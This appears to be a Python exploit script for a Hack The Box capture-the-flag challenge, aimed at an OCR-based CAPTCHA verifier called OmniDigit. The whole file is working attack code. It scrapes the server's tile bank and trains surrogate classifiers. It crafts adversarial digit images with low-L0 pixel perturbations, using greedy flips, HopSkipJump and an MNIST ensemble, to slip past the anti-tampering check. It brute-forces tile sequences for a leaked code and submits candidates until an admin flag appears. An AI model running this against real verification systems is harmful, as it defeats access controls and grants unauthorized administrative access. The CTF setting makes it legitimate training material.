#!/usr/bin/env python3
"""
OmniDigit helper for HTB staging.

The verifier receives one grayscale PNG made from six 28x28 public-bank tiles.
Anti-tampering is per-tile L0 distance against that bank, so this helper keeps
all baseline submissions bank-consistent and gives a narrow place to add L0
perturbation experiments.
"""

from __future__ import annotations

import argparse
import base64
import itertools
import re
import time
from dataclasses import dataclass
from io import BytesIO
from pathlib import Path
from typing import Any

import requests
from PIL import Image, ImageDraw


BASE_URL = "http://staging.phantomkernel.htb:30738"
HOME_PATH = "/omnidigit/"
API_VERIFY_PATH = "/omnidigit/api/verify"
HTML_VERIFY_PATH = "/omnidigit/verify"


@dataclass(frozen=True)
class Tile:
    tile_id: int
    image: Image.Image


TILE_RE = re.compile(
    r'src="data:image/png;base64,([^"]+)"\s*'
    r'class="pk-captcha-bank__tile"\s*'
    r'draggable="true"\s*'
    r'data-tile-id="(\d+)"',
    re.S,
)


def fetch_bank(base_url: str) -> dict[int, Tile]:
    response = requests.get(base_url + HOME_PATH, timeout=10)
    response.raise_for_status()

    tiles: dict[int, Tile] = {}
    for b64_data, tile_id_text in TILE_RE.findall(response.text):
        tile_id = int(tile_id_text)
        raw = base64.b64decode(b64_data)
        image = Image.open(BytesIO(raw)).convert("L")
        tiles[tile_id] = Tile(tile_id=tile_id, image=image)

    if len(tiles) != 30:
        raise RuntimeError(f"Expected 30 public tiles, got {len(tiles)}")
    return tiles


def build_captcha(tiles: dict[int, Tile], sequence: list[int]) -> bytes:
    if len(sequence) != 6:
        raise ValueError("OmniDigit expects exactly six tiles")

    canvas = Image.new("L", (168, 28), 0)
    for idx, tile_id in enumerate(sequence):
        canvas.paste(tiles[tile_id].image, (idx * 28, 0))
    return image_to_png(canvas)


def image_to_png(image: Image.Image) -> bytes:
    out = BytesIO()
    image.save(out, format="PNG")
    return out.getvalue()


def build_captcha_from_images(images: list[Image.Image]) -> bytes:
    if len(images) != 6:
        raise ValueError("OmniDigit expects exactly six tile images")

    canvas = Image.new("L", (168, 28), 0)
    for idx, image in enumerate(images):
        canvas.paste(image.convert("L"), (idx * 28, 0))
    return image_to_png(canvas)


def save_captcha(tiles: dict[int, Tile], sequence: list[int], path: Path) -> None:
    path.write_bytes(build_captcha(tiles, sequence))


def submit(base_url: str, png_data: bytes, html: bool = False) -> str:
    path = HTML_VERIFY_PATH if html else API_VERIFY_PATH
    files = {"file": ("captcha.png", png_data, "image/png")}
    response = requests.post(base_url + path, files=files, timeout=10)
    if response.status_code == 503:
        return "503 Instance Busy; wait a few seconds and retry."
    response.raise_for_status()
    return response.text


def probe_sequences(base_url: str, tiles: dict[int, Tile], sequences: list[list[int]]) -> None:
    for sequence in sequences:
        result = submit(base_url, build_captcha(tiles, sequence))
        print(f"{sequence}: {result}")
        if '"admin":true' in result or "HTB{" in result:
            save_captcha(tiles, sequence, Path("omnidigit_admin_candidate.png"))
            print("[+] Possible admin candidate saved to omnidigit_admin_candidate.png")
            return


def visual_sheet(tiles: dict[int, Tile], path: Path) -> None:
    sheet = Image.new("RGB", (720, 560), "white")
    draw = ImageDraw.Draw(sheet)
    for index, tile_id in enumerate(tiles):
        tile = tiles[tile_id].image.resize((84, 84), Image.Resampling.NEAREST)
        x = (index % 6) * 120 + 18
        y = (index // 6) * 112 + 4
        sheet.paste(Image.merge("RGB", (tile, tile, tile)), (x, y))
        draw.text((x, y + 86), f"id {tile_id}", fill=(255, 0, 0))
    sheet.save(path)


def require_ml() -> tuple[Any, Any, Any, Any]:
    try:
        import numpy as np
        from sklearn.datasets import load_digits
        from sklearn.neural_network import MLPClassifier
        from sklearn.preprocessing import MinMaxScaler
    except ImportError as exc:
        raise SystemExit(
            "Missing ML dependencies. Install requirements.txt or run: "
            "pip install numpy scikit-learn pillow requests adversarial-robustness-toolbox"
        ) from exc
    return np, load_digits, MLPClassifier, MinMaxScaler


def train_surrogate(random_state: int = 7) -> Any:
    np, load_digits, MLPClassifier, MinMaxScaler = require_ml()
    digits = load_digits()
    x_train = digits.images.reshape(len(digits.images), 64).astype("float32")
    y_train = digits.target

    scaler = MinMaxScaler()
    x_train = scaler.fit_transform(x_train)
    clf = MLPClassifier(
        hidden_layer_sizes=(128, 64),
        activation="relu",
        max_iter=600,
        random_state=random_state,
        early_stopping=True,
    )
    clf.fit(x_train, y_train)
    return clf


def tile_features(image: Image.Image) -> Any:
    np, *_ = require_ml()
    small = image.convert("L").resize((8, 8), Image.Resampling.LANCZOS)
    return (np.asarray(small, dtype="float32") / 255.0).reshape(1, -1)


def tile_probs(clf: Any, image: Image.Image) -> Any:
    return clf.predict_proba(tile_features(image))[0]


def tile_probs_batch(clf: Any, images: list[Image.Image]) -> Any:
    np, *_ = require_ml()
    features = [tile_features(image).reshape(-1) for image in images]
    return clf.predict_proba(np.asarray(features, dtype="float32"))


def score_target(clf: Any, image: Image.Image, target_digit: int) -> float:
    probs = tile_probs(clf, image)
    return float(probs[target_digit])


def rank_tiles_for_digit(tiles: dict[int, Tile], clf: Any, target_digit: int) -> list[tuple[int, float]]:
    ranked = []
    for tile_id, tile in tiles.items():
        ranked.append((tile_id, score_target(clf, tile.image, target_digit)))
    return sorted(ranked, key=lambda row: row[1], reverse=True)


def l0_greedy_tile_attack(
    clf: Any,
    image: Image.Image,
    target_digit: int,
    max_l0: int,
    beam: int = 8,
) -> Image.Image:
    """Targeted low-L0 attack against the local surrogate.

    It flips at most max_l0 pixels to black/white. This mirrors the known
    anti-tampering constraint better than unconstrained gradient attacks.
    """
    np, *_ = require_ml()
    arr = np.asarray(image.convert("L"), dtype="uint8")
    original = arr.copy()
    current = arr.copy()

    for _ in range(max_l0):
        changed = current != original
        points = np.argwhere(~changed)
        trials = []
        trial_meta = []
        for y, x in points:
            for value in (0, 255):
                if current[y, x] == value:
                    continue
                trial = current.copy()
                trial[y, x] = value
                trials.append(Image.fromarray(trial, mode="L"))
                trial_meta.append((y, x, value))

        if not trials:
            break

        probs = tile_probs_batch(clf, trials)[:, target_digit]
        best_indices = np.argsort(probs)[::-1][: max(beam, 1)]
        best_index = int(best_indices[0])
        best_score = float(probs[best_index])
        current_score = score_target(clf, Image.fromarray(current, mode="L"), target_digit)
        if best_score <= current_score:
            break
        y, x, value = trial_meta[best_index]
        current[y, x] = value

    return Image.fromarray(current, mode="L")


def art_hopskipjump_tile_attack(
    clf: Any,
    image: Image.Image,
    target_digit: int,
    max_l0: int,
    max_iter: int,
) -> Image.Image:
    """Use ART HopSkipJump, then project the result back to a low-L0 image."""
    np, *_ = require_ml()
    try:
        from art.attacks.evasion import HopSkipJump
        from art.estimators.classification import BlackBoxClassifier
    except ImportError as exc:
        raise SystemExit("ART is not installed. Install adversarial-robustness-toolbox.") from exc

    original = np.asarray(image.convert("L"), dtype="float32") / 255.0

    def predict_fn(batch: Any) -> Any:
        rows = []
        for sample in batch:
            sample_image = Image.fromarray((sample[:, :, 0] * 255).clip(0, 255).astype("uint8"), mode="L")
            rows.append(tile_probs(clf, sample_image))
        return np.asarray(rows, dtype="float32")

    classifier = BlackBoxClassifier(
        predict_fn=predict_fn,
        input_shape=(28, 28, 1),
        nb_classes=10,
        clip_values=(0.0, 1.0),
    )
    attack = HopSkipJump(
        classifier,
        targeted=True,
        norm=2,
        max_iter=max_iter,
        max_eval=200,
        init_eval=20,
        init_size=20,
        verbose=False,
    )
    target = np.zeros((1, 10), dtype="float32")
    target[0, target_digit] = 1.0
    adv = attack.generate(original.reshape(1, 28, 28, 1), y=target)[0, :, :, 0]

    delta = np.abs(adv - original)
    flat_order = np.argsort(delta.reshape(-1))[::-1][:max_l0]
    projected = original.copy().reshape(-1)
    adv_flat = adv.reshape(-1)
    projected[flat_order] = adv_flat[flat_order]
    projected = (projected.reshape(28, 28) * 255).clip(0, 255).astype("uint8")
    return Image.fromarray(projected, mode="L")


def adversarial_code_candidates(
    tiles: dict[int, Tile],
    target_code: str,
    max_l0: int,
    variants: int,
    use_art: bool,
    art_iter: int,
) -> list[tuple[list[int], list[Image.Image], list[float]]]:
    clf = train_surrogate()
    per_digit_rankings: list[list[tuple[int, float]]] = []
    for digit_text in target_code:
        ranking = rank_tiles_for_digit(tiles, clf, int(digit_text))
        per_digit_rankings.append(ranking[: max(variants, 1)])

    candidates = []
    attack_cache: dict[tuple[int, int], tuple[Image.Image, float]] = {}
    for combo in itertools.product(*per_digit_rankings):
        sequence = [tile_id for tile_id, _ in combo]
        attacked_images = []
        scores = []
        for tile_id, digit_text in zip(sequence, target_code):
            target_digit = int(digit_text)
            cache_key = (tile_id, target_digit)
            if cache_key in attack_cache:
                attacked, attacked_score = attack_cache[cache_key]
            else:
                base = tiles[tile_id].image
                if use_art:
                    attacked = art_hopskipjump_tile_attack(clf, base, target_digit, max_l0=max_l0, max_iter=art_iter)
                else:
                    attacked = l0_greedy_tile_attack(clf, base, target_digit, max_l0=max_l0)
                attacked_score = score_target(clf, attacked, target_digit)
                attack_cache[cache_key] = (attacked, attacked_score)
            attacked_images.append(attacked)
            scores.append(attacked_score)
        candidates.append((sequence, attacked_images, scores))

    candidates.sort(key=lambda row: sum(row[2]), reverse=True)
    return candidates


def run_adversarial(
    base_url: str,
    tiles: dict[int, Tile],
    target_code: str,
    max_l0: int,
    variants: int,
    limit: int,
    out_dir: Path,
    submit_remote: bool,
    use_art: bool,
    art_iter: int,
) -> None:
    out_dir.mkdir(parents=True, exist_ok=True)
    candidates = adversarial_code_candidates(
        tiles=tiles,
        target_code=target_code,
        max_l0=max_l0,
        variants=variants,
        use_art=use_art,
        art_iter=art_iter,
    )

    for index, (sequence, images, scores) in enumerate(candidates[:limit], start=1):
        png_data = build_captcha_from_images(images)
        path = out_dir / f"omnidigit_{target_code}_{index:03d}.png"
        path.write_bytes(png_data)
        print(f"[{index:03d}] seq={sequence} score={sum(scores):.4f} file={path}")
        if submit_remote:
            result = submit(base_url, png_data)
            print(f"      {result}")
            if '"admin":true' in result or "HTB{" in result:
                print(f"[+] Admin candidate: {path}")
                return
            time.sleep(0.4)


def train_mnist_ensemble(max_iter: int = 22, sample_size: int = 22000) -> list[Any]:
    try:
        import numpy as np
        from sklearn.datasets import fetch_openml
        from sklearn.neural_network import MLPClassifier
    except ImportError as exc:
        raise SystemExit(
            "Missing MNIST attack dependencies. Install requirements.txt first."
        ) from exc

    mnist = fetch_openml("mnist_784", version=1, as_frame=False, parser="auto")
    x_train = mnist.data.astype("float32") / 255.0
    y_train = mnist.target.astype(int)

    rng = np.random.default_rng(99)
    configs = [((256, 128), 21), ((128, 128), 22), ((300,), 23)]
    models = []
    for hidden_layers, seed in configs:
        indices = rng.choice(len(x_train), size=min(sample_size, len(x_train)), replace=False)
        clf = MLPClassifier(
            hidden_layer_sizes=hidden_layers,
            max_iter=max_iter,
            batch_size=256,
            random_state=seed,
            early_stopping=True,
        )
        clf.fit(x_train[indices], y_train[indices])
        models.append(clf)
    return models


def mnist_feature(image: Image.Image) -> Any:
    np, *_ = require_ml()
    return np.asarray(image.convert("L"), dtype="float32").reshape(1, -1) / 255.0


def mnist_target_score(models: list[Any], image: Image.Image, target_digit: int) -> float:
    np, *_ = require_ml()
    features = mnist_feature(image)
    return float(np.mean([model.predict_proba(features)[0, target_digit] for model in models]))


def mnist_batch_target_scores(models: list[Any], images: list[Image.Image], target_digit: int) -> Any:
    np, *_ = require_ml()
    features = np.asarray(
        [np.asarray(image.convert("L"), dtype="float32").reshape(-1) / 255.0 for image in images],
        dtype="float32",
    )
    return np.mean([model.predict_proba(features)[:, target_digit] for model in models], axis=0)


def mnist_l0_tile_attack(
    models: list[Any],
    image: Image.Image,
    target_digit: int,
    max_l0: int,
) -> Image.Image:
    np, *_ = require_ml()
    original = np.asarray(image.convert("L"), dtype="uint8")
    current = original.copy()

    for _ in range(max_l0):
        points = np.argwhere(current == original)
        trials = []
        meta = []
        for y, x in points:
            for value in (0, 255):
                if current[y, x] == value:
                    continue
                trial = current.copy()
                trial[y, x] = value
                trials.append(Image.fromarray(trial, mode="L"))
                meta.append((y, x, value))

        scores = mnist_batch_target_scores(models, trials, target_digit)
        best_index = int(np.argmax(scores))
        best_score = float(scores[best_index])
        current_score = mnist_target_score(models, Image.fromarray(current, mode="L"), target_digit)
        if best_score <= current_score:
            break
        y, x, value = meta[best_index]
        current[y, x] = value

    return Image.fromarray(current, mode="L")


def run_mnist_ensemble_attack(
    base_url: str,
    tiles: dict[int, Tile],
    target_code: str,
    variants: int,
    limit: int,
    max_l0: int,
    out_dir: Path,
    submit_remote: bool,
) -> None:
    models = train_mnist_ensemble()
    out_dir.mkdir(parents=True, exist_ok=True)

    rankings: dict[int, list[int]] = {}
    for digit_text in sorted(set(target_code)):
        digit = int(digit_text)
        ranked = sorted(
            [(tile_id, mnist_target_score(models, tile.image, digit)) for tile_id, tile in tiles.items()],
            key=lambda row: row[1],
            reverse=True,
        )
        rankings[digit] = [tile_id for tile_id, _ in ranked[:variants]]
        print(f"rank {digit}: {ranked[:min(8, len(ranked))]}")

    attack_cache: dict[tuple[int, int], tuple[Image.Image, float]] = {}

    def attacked(tile_id: int, digit: int) -> tuple[Image.Image, float]:
        key = (tile_id, digit)
        if key not in attack_cache:
            image = mnist_l0_tile_attack(models, tiles[tile_id].image, digit, max_l0=max_l0)
            score = mnist_target_score(models, image, digit)
            attack_cache[key] = (image, score)
            print(f"attack {key}: {score:.5f}")
        return attack_cache[key]

    pools = [rankings[int(digit_text)] for digit_text in target_code]
    jobs = []
    for sequence in itertools.product(*pools):
        images = []
        score = 0.0
        for tile_id, digit_text in zip(sequence, target_code):
            image, tile_score = attacked(tile_id, int(digit_text))
            images.append(image)
            score += tile_score
        jobs.append((score, list(sequence), images))
    jobs.sort(key=lambda row: row[0], reverse=True)

    for index, (score, sequence, images) in enumerate(jobs[:limit], start=1):
        png_data = build_captcha_from_images(images)
        path = out_dir / f"mnist_ensemble_{target_code}_{index:03d}.png"
        path.write_bytes(png_data)
        print(f"[{index:03d}] seq={sequence} score={score:.4f} file={path}")
        if submit_remote:
            result = submit(base_url, png_data)
            print(f"      {result}")
            if '"admin":true' in result or "HTB{" in result or "flag" in result.lower():
                print(f"[+] Admin candidate: {path}")
                return
            time.sleep(0.25)


def marker_candidates() -> list[list[int]]:
    # Visual candidates for the leaked marker 13-37-17 interpreted as OCR 133717.
    # Keep this small; broader searches should be rate-limited.
    one = [24, 33, 1, 17]
    three = [28, 8, 16, 34]
    seven = [8, 21, 18, 5]
    return [list(seq) for seq in itertools.product(one, three, three, seven, one, seven)]


def main() -> None:
    parser = argparse.ArgumentParser()
    parser.add_argument("--base-url", default=BASE_URL)
    parser.add_argument("--sequence", help="Comma-separated tile IDs, e.g. 24,28,28,8,24,8")
    parser.add_argument("--html", action="store_true", help="Submit to /omnidigit/verify instead of JSON API")
    parser.add_argument("--sheet", type=Path, help="Write a visual tile sheet")
    parser.add_argument("--probe-marker", action="store_true", help="Probe a small 133717 visual-candidate set")
    parser.add_argument("--target-code", help="Generate low-L0 adversarial candidates for this OCR code")
    parser.add_argument("--max-l0-per-tile", type=int, default=12)
    parser.add_argument("--variants", type=int, default=2, help="Top surrogate seed tiles per digit")
    parser.add_argument("--limit", type=int, default=10, help="Maximum adversarial candidates to write/submit")
    parser.add_argument("--out-dir", type=Path, default=Path("omnidigit_adv"))
    parser.add_argument("--submit-adv", action="store_true", help="Submit generated adversarial candidates remotely")
    parser.add_argument("--use-art", action="store_true", help="Use ART HopSkipJump before low-L0 projection")
    parser.add_argument("--art-iter", type=int, default=120)
    parser.add_argument("--mnist-ensemble", action="store_true", help="Use the stronger MNIST ensemble low-L0 attack")
    args = parser.parse_args()

    tiles = fetch_bank(args.base_url)

    if args.sheet:
        visual_sheet(tiles, args.sheet)

    if args.sequence:
        sequence = [int(part) for part in args.sequence.split(",")]
        png_data = build_captcha(tiles, sequence)
        Path("omnidigit_candidate.png").write_bytes(png_data)
        print(submit(args.base_url, png_data, html=args.html))

    if args.probe_marker:
        probe_sequences(args.base_url, tiles, marker_candidates())

    if args.target_code:
        if not re.fullmatch(r"\d{6}", args.target_code):
            raise SystemExit("--target-code must be exactly six digits")
        if args.mnist_ensemble:
            run_mnist_ensemble_attack(
                base_url=args.base_url,
                tiles=tiles,
                target_code=args.target_code,
                max_l0=args.max_l0_per_tile,
                variants=args.variants,
                limit=args.limit,
                out_dir=args.out_dir,
                submit_remote=args.submit_adv,
            )
        else:
            run_adversarial(
                base_url=args.base_url,
                tiles=tiles,
                target_code=args.target_code,
                max_l0=args.max_l0_per_tile,
                variants=args.variants,
                limit=args.limit,
                out_dir=args.out_dir,
                submit_remote=args.submit_adv,
                use_art=args.use_art,
                art_iter=args.art_iter,
            )


if __name__ == "__main__":
    main()
